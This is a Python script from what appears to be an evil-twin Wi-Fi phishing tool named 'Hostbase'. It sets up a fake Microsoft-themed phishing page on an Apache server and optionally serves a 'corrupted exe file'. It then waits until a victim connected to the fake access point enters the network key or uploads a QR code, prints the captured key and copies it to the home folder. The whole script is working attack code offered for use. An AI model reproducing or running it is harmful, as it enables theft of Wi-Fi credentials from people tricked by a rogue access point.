import os
import time
import subprocess
import sys
import signal


YELLOW = "\033[33m"
GREEN = "\033[32m"
CYAN = "\033[36m"
RED = "\033[31m"
RESET = "\033[0m"


with open('exe', 'r') as e:
 exe = e.read()


if '1' in exe:
    print(f"{YELLOW}Removing rules from apache server due to new settings detected...")
    print(f"{CYAN}EXE flag detected : will serve a phishing page using corrupted exe file")
    os.system("rm -rf page.txt")
    with open('page.txt', 'w') as f:
        f.write("microsoft")
    print(f"{CYAN}EXE mode, rewriting new rules and new phishing page in apache folder and restarting it...")
    restart = subprocess.Popen("bash newmode.sh", shell=True)
    time.sleep(35)
else:
  None


print('Waiting for users... ctrl+c to leave...')
os.system("killall wash")
while True:
    if os.stat("/srv/http/cle.txt").st_size >= 8 or os.stat("/srv/http/msftconnecttest/cle.txt").st_size >= 8 or len(os.listdir("/srv/http/msftconnecttest/qrcode")) > 0:
        break
    time.sleep(1)
else:
    raise ValueError("%s isn't a file!" % file_path)

time.sleep(20) # le temps de laisser l'utilisateur rentrer aussi la confirmation de clé.

print(f"{GREEN}KEY FOUND !")
print('User has connected to the fake AP and entered his key...')
if os.stat("/srv/http/cle.txt").st_size >= 8:
   with open("/srv/http/cle.txt", "r") as k:
    key = k.read()
    print(key)
    print(f"{RESET}Saving the key file to home folder...")
    os.system('cp -R /srv/http/cle.txt /home/')
    print("Done.")
elif len(os.listdir("/srv/http/msftconnecttest/qrcode")) > 0:
    print('User has uploaded something on /srv/http/msftconnecttest/qrcode')
    print('Go inside this folder to save the QR code and connect to the network')
else:
    with open("/srv/http/msftconnecttest/cle.txt", "r") as k:
        key = k.read()
        print(key)
        print(f"{RESET}Saving the key file to home folder...")
        os.system('cp -R /srv/http/msftconnecttest/cle.txt /home/')
        print("Done.")

print(f"{CYAN}Leaving Hostbase...")
exitscript = subprocess.Popen("python exit.py", shell=True)
sys.exit()
# exit de tout les process plus effacemment des fichier txt et csv, restart ne network manager
